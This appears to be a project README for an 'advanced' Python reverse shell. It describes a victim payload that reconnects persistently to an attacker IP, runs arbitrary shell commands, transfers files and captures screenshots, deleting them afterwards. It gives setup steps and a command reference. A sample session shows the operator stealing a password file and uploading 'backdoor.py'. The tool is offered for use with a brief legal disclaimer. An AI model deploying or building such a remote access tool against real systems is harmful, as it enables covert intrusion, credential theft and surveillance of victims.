# 🚀 Advanced Python Reverse Shell

This **advanced version** of the Python reverse shell is a powerful upgrade over the basic version, designed with reliability, extended capabilities, and operational stealth in mind. It maintains the simplicity of Python while introducing features critical for realistic penetration testing and red teaming exercises.

Unlike the basic version — which provides core command execution and a linear connection — this version ensures persistent communication, intelligent command handling, **file transfers**, **remote screenshot capture with automatic download**, and graceful session management, making it a practical tool for ethical hackers.

---

## 🆚 Basic vs Advanced: What's New?

| Feature                        | Basic Version                    | Advanced Version                                                       |
|-------------------------------|----------------------------------|------------------------------------------------------------------------|
| Persistent Reconnect          | ❌ Single connection attempt      | ✅ Reconnects every 5 seconds if listener is offline                   |
| File Download                 | ❌ Not supported                  | ✅ Substring-based listing and exact match download                    |
| File Upload                   | ❌ Not supported                  | ✅ From hacker to victim; handles non-existent/empty files             |
| Screenshot Capture            | ❌ Not supported                  | ✅ Captures screen, auto-downloads to hacker, deletes on victim        |
| Directory Navigation (`cd`)   | ✅ Supported                      | ✅ Improved with echoing and default display                           |
| Command Output Handling       | ⚠️ Limited fallback              | ✅ Cross-platform decoding (`cp437`/`utf-8`) with error resilience     |
| Empty Command Output Handling | ❌ No feedback                    | ✅ "No output" message returned                                        |
| Graceful Exit (`stop`)        | ✅ Supported                      | ✅ Clean shutdown of both ends                                         |
| Socket Reuse (`SO_REUSEADDR`) | ❌ Not handled                    | ✅ Enables fast restarts without port bind errors                      |

---

## 📁 Directory Contents

```

Advanced-Version/
├── README.md             # You are here
├── advanced\_hacker.py    # Attacker script (listener + command handler)
└── advanced\_victim.py    # Victim payload (persistent reverse shell)

````

---

## 💡 Core Features

- **🔁 Persistent Reconnect**: Victim retries connection to the hacker every 5 seconds until successful.
- **💻 Command Execution**: Cross-platform shell support using `subprocess.check_output()`.
- **📂 Directory Navigation (`cd`)**: 
  - `cd` alone → shows current directory.
  - `cd <path>` → changes directory and echoes confirmation.
- **📥 File Download**:
  - `download <name_or_prefix>` lists files if no extension is given.
  - Choose exact match to trigger download.
- **📤 File Upload**:
  - Uploads file from hacker to victim.
  - Sends 0-byte flag if file is missing or empty.
- **🖼️ Screenshot Capture + Auto-Download**:
  - `screenshot` command triggers remote screen capture.
  - File auto-saved on hacker with a timestamped filename like `screenshot-YYYY-MM-DD_HH-MM-SS.png`.
  - Victim deletes the local screenshot post-transfer.
- **🛑 Graceful Termination**: `stop` shuts down both hacker and victim scripts cleanly.
- **📡 Port Reuse**: Hacker uses `SO_REUSEADDR` to allow quick listener restarts.
- **⚙️ File Protocol**:
  - Binary transfers with 8-byte size header.
  - 0-byte signals special states like "file not found" or "empty".

---

## 🚀 Usage Guide

### 🔧 Step 1: Configure IP & Port

In both scripts, set:

```python
hacker_ip = "YOUR_ATTACKER_IP"
hacker_port = 10000
````

Use `ip a` (Linux) or `ipconfig` (Windows) to find your local IP.

---

### 🧠 Step 2: Start Hacker (Listener)

```bash
python3 advanced_hacker.py
```

Wait for an incoming connection.

---

### 👾 Step 3: Run Victim

On the target/victim machine:

```bash
python3 advanced_victim.py
```

The victim will keep attempting to connect every 5 seconds.

---

## 💬 Command Reference

| Command                     | Description                                                                 |
| --------------------------- | --------------------------------------------------------------------------- |
| `cd`                        | Show current directory                                                      |
| `cd <path>`                 | Change directory to `<path>`                                                |
| `download <name or prefix>` | Download file. If no extension, shows matches (e.g., `pass_` → lists files) |
| `upload <filename>`         | Upload a file from hacker to victim                                         |
| `screenshot`                | Capture and auto-download victim's screen                                   |
| `stop`                      | Cleanly terminates the session                                              |
| Any other shell command     | Executes directly on victim and returns output                              |

---

## 📌 Sample Session

**Attacker Terminal:**

```bash
python3 advanced_hacker.py
Listening for incoming connections...
[+] Connected with ('192.168.0.105', 50832)

> whoami
victim-pc\user

> cd Desktop
Changed directory to Desktop

> download pass_
All files with (pass_) name!
  [+] pass_info.txt
  [+] pass_list.docx
Type the exact file name (with extension!)

> download pass_list.docx
Yes, the file (pass_list.docx) exists!
Receiving file (38290 bytes)...
pass_list.docx downloaded successfully!

> upload backdoor.py
backdoor.py uploaded successfully!

> screenshot
Screenshot saved as screenshot-2025-06-03_08-00-00.png
Receiving file (95000 bytes)...
Screenshot downloaded successfully!
File also removed from victim!

> stop
[*] Session terminated. Exiting.
```

**Victim Terminal (illustrative):**

```
[*] Connected to hacker.
whoami is executed successfully!
cd Desktop is executed successfully!
download pass_ is executed successfully!
download pass_list.docx is executed successfully!
upload backdoor.py is executed successfully!
Receiving file [backdoor.py] (1024 bytes)...
[*] File 'backdoor.py' received and saved successfully.
screenshot is executed successfully!
File also removed from victim!
stop is executed successfully!
```

---

## 🧪 Technical Internals

### 🔄 Persistent Connection Loop

Victim loops forever until it establishes a connection with the hacker.

### ⚙️ Command Dispatch Logic

The victim parses and handles:

* `cd`
* `download`
* `upload`
* `screenshot`
* `stop`
* Anything else → executed in shell via `subprocess.check_output()`

### 📁 File Transfer Protocol

* Binary file data.
* Every file transfer begins with an **8-byte file size header**.
* Size = `0` is used to indicate error conditions (e.g., "not found").

### 🧬 Encoding Strategy

* Windows: `cp437`
* Linux/macOS: `utf-8`
* Fallback: `errors='replace'` to handle special characters safely.

---

## ⚠️ Legal Disclaimer

This tool is intended **solely for educational use** and authorized ethical hacking engagements. **Do not use this software on networks or devices you do not own or have explicit permission to test.** Unauthorized access is illegal. The author assumes no liability for misuse.

---
